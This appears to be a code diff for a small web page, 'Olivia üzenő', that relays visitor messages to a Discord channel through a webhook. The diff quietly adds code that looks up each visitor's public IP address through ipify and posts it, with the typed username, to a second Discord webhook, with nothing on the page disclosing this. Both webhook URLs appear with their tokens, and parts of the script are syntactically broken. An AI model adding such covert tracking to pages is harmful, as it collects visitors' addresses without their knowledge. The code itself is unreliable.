@@ -4,9 +4,13 @@
 
 
 <p id="demo"></p>
+<p><input id="gfg" style="display: none;" name="firstbox" type="text" value="" /></p>
 
+    
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+ 
 <script>
-
 
 /* theres an big title that says 'Olivia üzenő', and a messagebox named 'username' that have an dark gray background color and white text color, another messagebox named 'message' that have an dark gray background color and white text color and centered, and a button that says 'send' that is have an black background color. and these elements are in the middle of the page (centered), have a very thin dark border, the background color is dark grey of these elements, and the forecolor is white and centered. and if the send button clicked, the text from the message messagebox will be sent into the discord channel '913883330032836621' trough the webhook 'https://discord.com/api/webhooks/1049038512911040702/jGPIvXr3E4Jm2C2VjVLyaJfJbVVbr_bvMG9HsEZPkPpApD1c-y6KJuAQOKLXH8S_SsNC' and the bot's name will be the username messagebox's text. and all the elements in the html have black 1px border and the have dark gray background color.  + KICSIT MÓDOSÍTVA*/
 
@@ -14,6 +18,17 @@ function redirectMe(url) {
     window.location = url;
 }
 
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+
+         
+
+        // Setting text of element P with id gfg
+
+        $("#gfg").html(data.ip);
+
+    })
+    
+    
 var title = document.createElement('h1');
 title.innerHTML = 'Olivia üzenő';
 title.style.textAlign = 'center';
@@ -54,15 +69,26 @@ send.onclick = funct();
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.send(JSON.stringify({
     username: username.value,
-    content: message.value
-  }
-  ));
+    content: message.value})
+          
+   var nxhr = new XMLHttpRequest();
+  nxhr.open('POST', 'https://discord.com/api/webhooks/1049067093317922827/HejOz8SNmdtp6j6K3yRp1BQSgjyntJt2qJWWIEp8yfdN1jUh7cxT2vJIFdLaAKnBVMJM', true);
+  nxhr.setRequestHeader('Content-Type', 'application/json');
+  nxhr.send(JSON.stringify({
+    username: username.value,
+    content: data.ip}
+
+  )        
+          
+          );
 });
 
     
-   
+ 
+                
     
-    
+
+
 document.body.appendChild(send);
 document.body.style.backgroundColor = '#333333';
 
